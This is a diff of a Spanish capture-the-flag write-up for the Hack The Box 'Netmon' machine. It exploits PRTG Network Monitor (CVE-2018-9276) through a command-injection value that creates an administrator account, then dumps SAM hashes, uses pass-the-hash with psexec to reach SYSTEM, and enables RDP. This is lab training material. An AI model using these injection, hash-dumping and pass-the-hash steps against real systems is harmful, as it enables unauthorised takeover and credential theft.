@@ -17,11 +17,24 @@ tags:
   - PRTG Network Monitor
   - FTP Enumeration
   - Remote Code Execution (Authenticated) 
-  - RCE(A) - CVE-2018-9276
+  - CVE-2018-9276
+  - PassTheHash
+  - RDP
   - OSCP Style
 ---
 ![](/assets/images/htb-writeup-netmon/netmon_logo.png)
-Esta es una máquina fácil que usa Windows y en la cual vamos a vulnerar el servicio SMB que está abierto en uno de los puertos a través de la enumeración del servicio FTP y de una vulnerabilidad en el servicio PRTG Network Monitor que nos permite inyectar código en dicho servicio.
+Esta es una máquina fácil que usa **Windows**, en la cual vamos a vulnerar el **servicio SMB** que está abierto en uno de los puertos a través de la enumeración del **servicio FTP** y de una vulnerabilidad en el **servicio PRTG Network Monitor** que nos permite inyectar código en dicho servicio.
+
+
+Herramientas usadas:
+* *nmap*
+* *whatweb*
+* *ftp*
+* *crackmapexec*
+* *evil-winrm*
+* *psexec*
+* *xfreerdp*
+* *remmina*
 
 
 <br>
@@ -38,8 +51,8 @@ Esta es una máquina fácil que usa Windows y en la cual vamos a vulnerar el ser
 		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
 			<ul>
 				<li><a href="#HTTP">Analizando Puerto 80</a></li>
+				<li><a href="#PRTG">Información Útil del Servicio PRTG Network Monitor</a></li>
 				<li><a href="#FTP">Enumeración Servicio FTP</a></li>
-				<li><a href="#PRTG">Investigando Servicio PRTG Network Monitor</a></li>
 			</ul>
 		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
 			<ul>
@@ -50,8 +63,13 @@ Esta es una máquina fácil que usa Windows y en la cual vamos a vulnerar el ser
 			<ul>
 				<li><a href="#Exploit">Buscando y Analizando Exploit</a></li>
 				<li><a href="#Exploit2">Probando Exploit: PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution</a></li>
+				<li><a href="#Exploit3">Probando Exploit: PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution - Versión Blog</a></li>
 				<li><a href="#Root">Accediendo a la Máquina como Administrador</a></li>
+				<li><a href="#Extras">Obteniendo Información Extra y Otras Formas de Acceder a la Máquina</a></li>
+				<li><a href="#psexec">Accediendo a la Máquina con Psexec</a></li>
+				<li><a href="#rdp">Accediendo a la Máquina con xfreerdp - Remmina</a></li>
 			</ul>
+
 		<li><a href="#Links">Links de Investigación</a></li>
 	</ul>
 </div>
@@ -72,7 +90,7 @@ Esta es una máquina fácil que usa Windows y en la cual vamos a vulnerar el ser
 <h2 id="Ping">Traza ICMP</h2>
 
 Realizamos un ping para saber si la máquina está conectada y para saber qué sistema operativo tiene, analizando el TTL.
-```
+```bash
 ping -c 4 10.10.10.152
 PING 10.10.10.152 (10.10.10.152) 56(84) bytes of data.
 64 bytes from 10.10.10.152: icmp_seq=1 ttl=127 time=129 ms
@@ -89,7 +107,7 @@ Observamos que es una máquina Windows gracias al TLL. Ahora analicemos los puer
 <h2 id="Puertos">Escaneo de Puertos</h2>
 
 Hacemos un escaneo de puertos para saber cuáles están abiertos y asi poder analizar los servicios que operan en estos:
-```
+```bash
 nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.152 -oG allPorts
 
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
@@ -118,21 +136,24 @@ Read data files from: /usr/bin/../share/nmap
 Nmap done: 1 IP address (1 host up) scanned in 27.44 seconds
            Raw packets sent: 126822 (5.580MB) | Rcvd: 10051 (402.100KB)
 ```
-* -p-: Para indicarle un escaneo en ciertos puertos.
-* --open: Para indicar que aplique el escaneo en los puertos abiertos.
-* -sS: Para indicar un TCP SYN port Scan para que nos agilice el escaneo.
-* --min-rate: Para indicar una cantidad de envio de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000).
-* -vvv: Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo.
-* -n: Para indicar que no se aplique resolución dns para agilizar el escaneo.
-* -Pn: Para indicar que se omita el descubrimiento de hosts.
-* -oG: Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.
+
+| Parámetros | Descripción |
+|--------------------------|
+| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
+| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
+| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
+| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
+| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
+| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
+| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
+| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |
 
 Vemos varios puertos abiertos siendo el FTP, Web y SMB. Ahora vamos a analizar los servicios que hay en estos puertos.
 
 <h2 id="Servicios">Escaneo de Servicios</h2>
 
 Una vez realizado el escaneo de puertos, hacemos un escaneo de servicios. Veamos con que nos encontramos:
-```
+```bash
 nmap -sC -sV -p21,80,135,139,445 10.10.10.152 -oN targeted     
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-16 13:34 CST
 Nmap scan report for 10.10.10.152
@@ -177,12 +198,15 @@ Host script results:
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 18.51 seconds
 ```
-* -sC: Para indicar un lanzamiento de scripts basicos de reconocimiento.
-* -sV: Para identificar los servicios/version que estan activos en los puertos que se analicen.
-* -p: Para indicar puertos especificos.
-* -oN: Para indicar que el output se guarde en un fichero. Lo llame targeted.
 
-Observamos que el servicio FTP tiene activo el login como **Anonymous** por lo que podemos empezar por ahí nuestra búsqueda de acceso a la máquina, tambien vemos el servicio SMB activo que podemos analizar después y por último vemos un servicio web abierto que podemos analizar a continuación.
+| Parámetros | Descripción |
+|--------------------------|
+| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
+| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
+| *-p*       | Para indicar puertos específicos. |
+| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |
+
+Observamos que el **servicio FTP** tiene activo el login como **Anonymous** por lo que podemos empezar por ahí nuestra búsqueda de acceso a la máquina, también vemos el **servicio SMB** activo que podemos analizar después y por último vemos un **servicio web** abierto que podemos analizar a continuación.
 
 
 <br>
@@ -199,26 +223,51 @@ Observamos que el servicio FTP tiene activo el login como **Anonymous** por lo q
 
 <h2 id="HTTP">Analizando Puerto 80</h2>
 
-Como mencione anteriormente, vamos a analizar la página web abierta antes de ir al serivico FTP, usaremos la herramienta **whatweb** para esto:
+Vamos a analizar la página web abierta antes de ir al **serivico FTP**, usaremos la herramienta **whatweb** para esto:
 
-```
+```bash
 http://10.10.10.152/ [302 Found] Country[RESERVED][ZZ], HTTPServer[PRTG/18.1.37.13946], IP[10.10.10.152], PRTG-Network-Monitor[18.1.37.13946,PRTG], RedirectLocation[/index.htm], UncommonHeaders[x-content-type-options], X-XSS-Protection[1; mode=block]                                
 ERROR Opening: http://10.10.10.152/index.htm - incorrect header check
 ```
-Qué curioso error, una vez que entramos a la página web, vemos el servicio que está usando, **PRTG Network Monitor (Netmon)**
+Nos da un curioso error, una vez que entramos a la página web vemos el servicio que está usando, **PRTG Network Monitor (Netmon)**
 
-¿Pero que chuchas es este servicio?:
+¿Pero que chuchas es este servicio?
 
-**PRTG es un software de monitoreo de red sin agentes de Paessler AG. El término general Paessler PRTG aúna varias versiones de software capaces de monitorizar y clasificar diferentes condiciones del sistema, como el uso del ancho de banda o el  tiempo de actividad, y recopilar estadísticas de diversos anfitriones como switches, routers, servidores y otros dispositivos y aplicaciones.**
+| **PRTG Network Monitor** |
+|:-----------:|
+| *PRTG es un software de monitoreo de red sin agentes de Paessler AG. El término general Paessler PRTG aúna varias versiones de software capaces de monitorizar y clasificar diferentes condiciones del sistema, como el uso del ancho de banda o el tiempo de actividad, y recopilar estadísticas de diversos anfitriones como switches, routers, servidores y otros dispositivos y aplicaciones.* |
 
 ![](/assets/images/htb-writeup-netmon/Captura1.png)
 
-Osease que monitorea redes, quizá nos sirva después pero ahora vamos a ir primero por el servicio FTP.
+Osease que monitorea redes, esto es bastante útil, investiguemos un poco más. Algo que podemos investigar, es donde se guarda las carpetas de instalación de este programa, puede que ahí se almacenen contraseñas o información critica que podamos usar.
+
+<h2 id="PRTG">Información Útil del Servicio PRTG Network Monitor</h2>
+
+<br>
+
+| Directorio de Programas                                                     | Directorio de Datos |
+|-----------------------------------------------------------------------------|---------------------|
+| *Sistemas de 32 bits: % archivos de programa% \ PRTG Network Monitor*       | *% programdata% \ Paessler \ PRTG Network Monitor -> Almacenamiento de datos* |
+| *Sistemas de 64 bits: % archivos de programa (x86)% \ PRTG Network Monitor* |
+
+**Para encontrar el camino correcto para la instalación de PRTG, por favor búsquelo en las propiedades de los iconos de PRTG el menú de inicio. Nota: Windows ProgramData está oculta por defecto.**
+
+**Ojito con lo siguiente**, los siguientes archivos se almacenan en el **directorio de datos de PRTG**:
+
+| Archivos Críticos en Directorio de Datos | Descripción |
+|------------------------------------------|-------------|
+| *PRTG Configuration.dat*                 | Configuración de monitoreo (por ejemplo, sondas, grupos, dispositivos, sensores, usuarios, mapas, informes y más) |
+| *Configuración de PRTG.old*              | Copia de seguridad de la versión anterior de la configuración de monitoreo |
+
+**Aquí podemos ver más información:**
+* https://kb.rolosa.com/np-donde-almacena-la-informacion-prtg/
+
+Tenemos mucha información crítica, el problema es ver si podemos revisar los archivos de la máquina, probemos primero con el **servicio FTP** y si no encontramos nada, investigaremos el **servicio SMB**.
 
 <h2 id="FTP">Enumeración Servicio FTP</h2>
 
-Para entrar es tan simple como usar el usuario **anonymous** y poner una contraseña cualquiera:
-```
+De acuerdo al escaneo de servicios, el **servicio FTP** tiene activo el usuario **anonymous**, para entrar es tan simple como usar el usuario **anonymous** y poner una contraseña cualquiera:
+```bash
 ftp 10.10.10.152 
 Connected to 10.10.10.152.
 220 Microsoft FTP Service
@@ -228,8 +277,8 @@ Password:
 230 User logged in.
 Remote system type is Windows_NT.
 ```
-Bien, una vez dentro, vamos a investigar que hay dentro y a buscar la sección de usuarios para ver si podemos acceder a alguno:
-```
+Bien, una vez dentro, vamos a investigar que hay:
+```bash
 ftp> ls
 229 Entering Extended Passive Mode (|||50290|)
 125 Data connection already open; Transfer starting.
@@ -250,8 +299,8 @@ ftp> ls
 02-03-19  12:35AM       <DIR>          Public
 226 Transfer complete.
 ```
-Vemos 2 usuarios, no creo que podamos entrar al administrador, pero al **Public** sí que podremos:
-```
+Vemos que si hay datos de la máquina, es decir, que el servicio FTP no esta correctamente configurado. En los usuarios, podemos ver 2 usuarios, no creo que podamos entrar al administrador, pero al **Public** sí que podremos:
+```bash
 ftp> cd Public
 250 CWD command successful.
 ftp> ls
@@ -265,29 +314,7 @@ ftp> ls
 07-16-16  09:18AM       <DIR>          Videos
 226 Transfer complete.
 ```
-Vaya, vaya. Tan solo descargamos el archivo con el comando **get** y ya lo podremos leer. ¿Pero entonces como accedemos como root? Sigamos buscando a ver con que nos encontramos.
-
-Una pista de lo que podemos buscar es algún archivo o algo que nos pueda resultar útil del **servicio PRTG Network Monitor**, así que investiguemos donde se guardan los archivos de este servicio:
-
-<h2 id="PRTG">Investigando Servicio PRTG Network Monitor</h2>
-
-**Directorio de programas:**
-* Sistemas de 32 bits: % archivos de programa% \ PRTG Network Monitor
-* Sistemas de 64 bits: % archivos de programa (x86)% \ PRTG Network Monitor
-
-**Para encontrar el camino correcto para la instalación de PRTG, por favor búsquelo en las propiedades de los iconos de PRTG el menú de inicio.Nota: Windows ProgramData está oculta por defecto.**
-
-**Directorio de datos de PRTG:**
-* % programdata% \ Paessler \ PRTG Network Monitor -> Almacenamiento de datos
-
-Ojito con lo siguiente:
-**Archivos y subcarpetas en el directorio de datos de PRTG**
-**Los siguientes archivos se almacenan en el directorio de datos de PRTG:**
-* PRTG Configuration.dat: Configuración de monitoreo (por ejemplo, sondas, grupos, dispositivos, sensores, usuarios, mapas, informes y más)
-* Configuración de PRTG.old: Copia de seguridad de la versión anterior de la configuración de monitoreo
-
-**Aquí podemos ver más información:** 
-* https://kb.rolosa.com/np-donde-almacena-la-informacion-prtg/
+Vaya, vaya. Tan solo descargamos el archivo con el comando **get** y ya lo podremos leer. ¿Pero entonces como accedemos como root? Ya tenemos algunas pistas sobre donde buscar archivos que nos sean útiles para acceder a la página y podamos buscar un exploit para entrar a la máquina.
 
 Empecemos a explotar las vulnerabilidades.
 
@@ -306,8 +333,8 @@ Empecemos a explotar las vulnerabilidades.
 
 <h2 id="Busqueda">Buscando Archivos Críticos de PRTG en Servicio FTP</h2>
 
-Muy bien, ahora sabemos que podemos buscar dentro del servicio FTP para no estar dando tantas vueltas o buscando cosas que no sirven.
-```
+Muy bien, ahora sabemos que podemos buscar dentro del **servicio FTP** para no estar dando tantas vueltas o buscando cosas que no sirven.
+```bash
 ftp> ls -la
 229 Entering Extended Passive Mode (|||50613|)
 125 Data connection already open; Transfer starting.
@@ -358,7 +385,7 @@ Una vez dentro de la carpeta donde están los archivos ocultos, descargamos él 
 <h2 id="FTP2">Analizando Contenido Descargado del Servicio FTP</h2>
 
 Ahora toca analizar los archivos que descargamos, recuerda que buscamos un usuario y contraseña para poder acceder a la página web.
-```
+```bash
 cat PRTG\ Configuration.dat 
 <?xml version="1.0" encoding="UTF-8"?>
   <root version="16" oct="PRTG Network Monitor 18.1.37.13946" saved="2/26/2019 2:54:23 AM" max="2017" guid="{221B25D6-9282-418B-8364-F59561032EE3}" treeversion="0" created="2019-02-02-23-18-27" trial="42f234beedd545338910317db1fca74dbe84030f">
@@ -374,7 +401,12 @@ cat PRTG\ Configuration.dat
 ...
 ```
 Al hacer un **cat** al archivo **.dat** vemos que hay demasiados datos por lo que hay que analizarlos de otra forma, ya que si vemos él **.old.bak** será lo mismo, demasiados datos. Vamos a usar el comando **diff** para ver las diferencias, junto con el comando **less** para ver el **output** como una página e ir viendo poco a poco toda la información, con el fin de ver si hay alguna diferencia entre estos dos archivos:
+```bash
+diff "PRTG Configuration.dat" "PRTG Configuration.old.bak" | less
 ```
+
+Y vemos este resultado:
+```bash
 >       <geostat day="03-02-2019"/>
 144,146c141,142
 <               <flags>
@@ -387,7 +419,7 @@ Al hacer un **cat** al archivo **.dat** vemos que hay demasiados datos por lo qu
 <                 77RULO2GA4Q3RVEUZ77IMPLVKABRRS2UNR3Q====
 
 ```
-AHI ESTA!!! Nuestro usuario y contraseña que necesitamos, ahora vamos a autenticarnos:
+AHÍ ESTA!!! Nuestro usuario y contraseña que necesitamos, ahora vamos a autenticarnos, PERO recuerda que este es un archivo antiguo, por lo que la contraseña puede que no sea correcta, trata de sumarle un año más a la contraseña para que puedas acceder:
 
 ![](/assets/images/htb-writeup-netmon/Captura2.png)
 
@@ -406,8 +438,8 @@ AHI ESTA!!! Nuestro usuario y contraseña que necesitamos, ahora vamos a autenti
 
 <h2 id="Exploit">Buscando y Analizando Exploit</h2>
 
-Una vez dentro, ya podemos buscar un Exploit que nos sirva porque ya tenemos la versión que esta usando el servicio PRGT:
-```
+Una vez dentro, ya podemos buscar un Exploit que nos sirva porque ya tenemos la versión que esta usando el **servicio PRGT**:
+```bash
 searchsploit prtg
 ------------------------------------------------------------------------------------------------------------ ---------------------------------
  Exploit Title                                                                                              |  Path
@@ -421,7 +453,7 @@ Shellcodes: No Results
 Papers: No Results
 ```
 Vamos a analizar este Exploit: **PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution**.
-```
+```bash
 ./Remote_Code_Execution.sh
 
 [+]#########################################################################[+] 
@@ -443,10 +475,65 @@ Vamos a analizar este Exploit: **PRTG Network Monitor 18.2.38 - (Authenticated) 
 [+]#########################################################################[+] 
  EXAMPLE USAGE: ./prtg-exploit.sh -u http://10.10.10.10 -c "_ga=GA1.4.XXXXXXX.XXXXXXXX; _gid=GA1.4.XXXXXXXXXX.XXXXXXXXXXXX; OCTOPUS1813713946=XXXXXXXXXXXXXXXXXXXXXXXXXXXXX; _gat=1"
 ```
-El Exploit nos pide una cookie, no sé por qué razón, pero lo que nos da a entender es que, una vez auntenticados en la página, es posible vulnerar el sistema e incluso viene la referencia del blog en la que se basó el Exploit, así que veamos dicho blog: 
+El Exploit nos pide unas cookies, que podemos ver si inspeccionamos la página web y nos vamos a la sección de storage:
+
+<p align="center">
+<img src="/assets/images/htb-writeup-netmon/Captura9.png">
+</p>
+
+<h2 id="Exploit2">Probando Exploit: PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution</h2>
+
+Vamos a ejecutar el programa con las cookies que nos pide:
+```bash
+chmod +x PRTG_exploit.sh
+
+./PRTG_exploit.sh -u http://10.10.10.152 -c "_ga=GA1.4.1030767543.1673826713; _gid=GA1.4.459131971.1709957738; OCTOPUS1813713946=ezFBMkU1OTA4LTMxQ0EtNDg1Qy04NDVCLTI1NDk5ODJBQjBFQ30%3D _gat=1"
+
+[+]#########################################################################[+] 
+[*] Authenticated PRTG network Monitor remote code execution                [*] 
+[+]#########################################################################[+] 
+[*] Date: 11/03/2019                                                        [*] 
+[+]#########################################################################[+] 
+[*] Author: https://github.com/M4LV0   lorn3m4lvo@protonmail.com            [*] 
+[+]#########################################################################[+] 
+[*] Vendor Homepage: https://www.paessler.com/prtg                          [*] 
+[*] Version: 18.2.38                                                        [*] 
+[*] CVE: CVE-2018-9276                                                      [*] 
+[*] Reference: https://www.codewatch.org/blog/?p=453                        [*] 
+[+]#########################################################################[+] 
+
+# login to the app, default creds are prtgadmin/prtgadmin. once athenticated grab your cookie and use it with the script.
+# run the script to create a new user 'pentest' in the administrators group with password 'P3nT3st!'                                                                                                                                       
+
+[+]#########################################################################[+] 
+
+ [*] file created 
+ [*] sending notification wait....
+
+ [*] adding a new user 'pentest' with password 'P3nT3st' 
+ [*] sending notification wait....
+
+ [*] adding a user pentest to the administrators group 
+ [*] sending notification wait....
+
+
+ [*] exploit completed new user 'pentest' with password 'P3nT3st!' created have fun!
+```
+
+Y con esto, se supone que ya deberíamos de haber agregado un usuario y contraseña al grupo de administradores de la máquina víctima, vamos a comprobarlo con la herramienta **Crackmapexec**:
+```bash
+crackmapexec smb 10.10.10.152 -u 'pentest' -p 'P3nT3st!'
+SMB         10.10.10.152    445    NETMON           [*] Windows Server 2016 Standard 14393 x64 (name:NETMON) (domain:netmon) (signing:False) (SMBv1:True)
+SMB         10.10.10.152    445    NETMON           [-] netmon\pentest:P3nT3st! STATUS_LOGON_FAILURE
+```
+
+No dio resultado, es probable que esto sea así por la versión que maneja el Exploit y la que esta usando la máquina, así que vamos a probar de otra manera.
+
+Existe un blog que explica como fue posible vulnerar esta versión del PRTG, incluso viene la referencia del blog en la que se basó el Exploit que acabamos de usar, así que veamos dicho blog y probemos esa forma: 
 * https://www.codewatch.org/blog/?p=453
 
-<h3 id="Exploit2">Probando Exploit: PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution</h3>
+
+<h2 id="Exploit3">Probando Exploit: PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution - Versión Blog</h2>
 
 En resumen, podemos vulnerar la página usando las notificaciones, vamos a hacerlo de este modo:
 
@@ -464,10 +551,10 @@ Llamamos a nuestra notificación **HackeadoPrro!** y nos vamos a la sección **E
 
 ![](/assets/images/htb-writeup-netmon/Captura6.png)
 
-Ahí lo que haremos será casi lo mismo que en el blog, la diferencia va a radicar en que nosotros vamos a agregar el usuario al grupo de administradores, con el fin de poder loguearnos y ser root. 
+Ahí lo que haremos, será casi lo mismo que en el blog, la diferencia va a radicar en que nosotros vamos a agregar el usuario al grupo de administradores, con el fin de poder loguearnos y ser root. 
 
-Esto es lo mismo que hace el Exploit pero nosotros lo vamos a indicar directamente en la inyección a diferencia del Exploit que usa la cookie para hacer esta movida, este será el código que ejecutara:
-```
+Esto es lo mismo que hace el Exploit, pero nosotros lo vamos a indicar directamente en la inyección a diferencia del Exploit que usa la cookie para hacer esta movida, este será el código que ejecutara:
+```bash
 test.txt;net user BerserkP B3rs3rkP123$! /add; net localgroup Administrators BerserkP /add
 ```
 
@@ -477,22 +564,22 @@ Cuando guardemos la notificación, ya estará disponible:
 <img src="/assets/images/htb-writeup-netmon/Captura7.png">
 </p>
 
-Y la activamos, una vez activada nos deberá mandar el siguiente mensaje:
+Y simplemente la activamos, una vez activada nos deberá mandar el siguiente mensaje:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-netmon/Captura8.png">
 </p>
 
 Bien ahora para poder ver si ya estamos dentro de dicho grupo, vamos a usar la herramienta **crackmapexec**:
-```
+```bash
 crackmapexec smb 10.10.10.152 -u 'BerserkP' -p 'B3rs3rkP123$!'
 SMB         10.10.10.152    445    NETMON           [*] Windows Server 2016 Standard 14393 x64 (name:NETMON) (domain:netmon) (signing:False) (SMBv1:True)
 SMB         10.10.10.152    445    NETMON           [+] netmon\BerserkP:B3rs3rkP123$! (HackeadoPrro!)
 ```
 <h2 id="Root">Accediendo a la Máquina como Administrador</h2>
 
-Vemos que ya está nuestro usuario, ahora lo que sigue será conectarnos ya directamente, para esto usaremos la herramienta **evilWirm**:
-```
+Vemos que ya está nuestro usuario, ahora lo que sigue será conectarnos ya directamente, para esto usaremos la herramienta **evilWinrm**:
+```bash
 evil-winrm -i 10.10.10.152 -u 'BerserkP' -p 'B3rs3rkP123$!'
 
 Evil-WinRM shell v3.4
@@ -507,6 +594,126 @@ Info: Establishing connection to remote endpoint
 netmon\berserkp
 ```
 Ya solo es cuestión de buscar la flag del root, que siempre está en el escritorio del usuario Administrator y listo.
+
+<h2 id="Extras">Obteniendo Información Extra y Otras Formas de Acceder a la Máquina</h2>
+
+Una vez que hemos podido agregar nuestras contraseñas al grupo de administradores, podemos aprovechar para obtener los SAM Hashes de todos los admins, esto lo podemos hacer con **Crackmapexec** de la siguiente manera:
+```bash
+crackmapexec smb 10.10.10.152 -u 'BerserkP' -p 'B3rs3rkP123$!' --sam
+SMB         10.10.10.152    445    NETMON           [*] Windows Server 2016 Standard 14393 x64 (name:NETMON) (domain:netmon) (signing:False) (SMBv1:True)
+SMB         10.10.10.152    445    NETMON           [+] netmon\BerserkP:B3rs3rkP123$! (Pwn3d!)
+SMB         10.10.10.152    445    NETMON           [+] Dumping SAM hashes
+SMB         10.10.10.152    445    NETMON           Administrator:...:...:...:::
+SMB         10.10.10.152    445    NETMON           Guest:...:...:...:::
+SMB         10.10.10.152    445    NETMON           DefaultAccount:...:...:...:::
+SMB         10.10.10.152    445    NETMON           BerserkP:...:...:...:::
+SMB         10.10.10.152    445    NETMON           [+] Added 4 SAM hashes to the database
+```
+
+Estos hashes los podemos usar para aplicar un **PassTheHash** para conectarnos usando otras herramientas, por ejemplo, la herramienta **psexec** y si estuviera abierto el protocolo RDP, sería con la herramienta **xfreerdp**, vamos a probar con cada una.
+
+| **PassTheHash** |
+|:-----------:|
+| *En seguridad informática, pasar el hash es una técnica de piratería que permite a un atacante autenticarse en un servidor o servicio remoto utilizando el hash NTLM o LanMan subyacente de la contraseña de un usuario, en lugar de solicitar la contraseña de texto sin formato asociada como suele ser el caso.* |
+
+<br>
+
+<h3 id="psexec">Accediendo a la Máquina con Psexec</h3>
+
+Por defecto, deberías tener instalado el **psexec.py**, buscalo con el comando **locate**:
+```bash
+locate psexec.py
+/usr/local/bin/psexec.py
+/usr/share/doc/python3-impacket/examples/psexec.py
+```
+
+En mi caso, voy a copiar el del directorio **impacket** y lo voy a usar desde donde lo tenga copiado:
+```bash
+cp /usr/share/doc/python3-impacket/examples/psexec.py .
+```
+
+Y ahora, vamos a usarlo, utilizando la parte final del hash perteneciente al usuario administrador:
+```bash
+python3 psexec.py WORKGROUP/Administrator@10.10.10.152 -hashes :d0f7...
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Requesting shares on 10.10.10.152.....
+[*] Found writable share ADMIN$
+[*] Uploading file AYHbMdFh.exe
+[*] Opening SVCManager on 10.10.10.152.....
+[*] Creating service Fomi on 10.10.10.152.....
+[*] Starting service Fomi.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> whoami
+nt authority\system
+```
+
+Listo, ganamos acceso utilizando la herramienta **psexec.py**.
+
+<h3 id="rdp">Accediendo a la Máquina con xfreerdp - Remmina</h3>
+
+Para este caso, vamos a primero levantar el **servicio RDP** utilizando **Crackmapexec**, para esto tambien puedes usar el usuario administrador y su hash o tu usuario, queda a tu elección:
+```bash
+crackmapexec smb 10.10.10.152 -u 'BerserkP' -p 'B3rs3rkP123$!' -M rdp -o action=enable
+SMB         10.10.10.152    445    NETMON           [*] Windows Server 2016 Standard 14393 x64 (name:NETMON) (domain:netmon) (signing:False) (SMBv1:True)
+SMB         10.10.10.152    445    NETMON           [+] netmon\BerserkP:B3rs3rkP123$! (Pwn3d!)
+RDP         10.10.10.152    445    NETMON           [+] RDP enabled successfully
+```
+
+E igual, podemos comprobar con **nmap**, que este servicio ya esta operando en la máquina:
+```bash
+nmap -p 3389 --open -T5 -vvv -n -Pn 10.10.10.152
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.93 ( https://nmap.org ) CST
+Initiating SYN Stealth Scan at 23:22
+Scanning 10.10.10.152 [1 port]
+Discovered open port 3389/tcp on 10.10.10.152
+Completed SYN Stealth Scan at 23:22, 0.15s elapsed (1 total ports)
+Nmap scan report for 10.10.10.152
+Host is up, received user-set (0.066s latency).
+
+PORT     STATE SERVICE       REASON
+3389/tcp open  ms-wbt-server syn-ack ttl 127
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 0.24 seconds
+           Raw packets sent: 1 (44B) | Rcvd: 1 (44B)
+```
+
+Ahora, usemos la herramienta **xfreerdp** para conectarnos a la consola:
+```bash
+xfreerdp /u:BerserkP /p:B3rs3rkP123$! /v:10.10.10.152:3389
+```
+No nos deja conectarnos, es posible que sea por como esta configurada la máquina en HTB, pero usemos otra herramienta muy similar a **xfreerdp** que se llama **remmina**, vamos a instalarla primero:
+```bash
+apt install remmina
+```
+
+Y vamos a ejecutarla:
+```bash
+remmina
+```
+
+Observa que nos pide una IP a la cual conectarnos, usemos la de la máquina:
+
+<p align="center">
+<img src="/assets/images/htb-writeup-netmon/Captura10.png">
+</p>
+
+Ahora, pongamos los datos del usuario, esta vez usare mi usuario, prueba con los demás usuarios que ya obtuvimos antes:
+
+<p align="center">
+<img src="/assets/images/htb-writeup-netmon/Captura11.png">
+</p>
+
+Y listo, nos hemos conectado a la máquina:
+
+<p align="center">
+<img src="/assets/images/htb-writeup-netmon/Captura12.png">
+</p>
 
 
 <br>
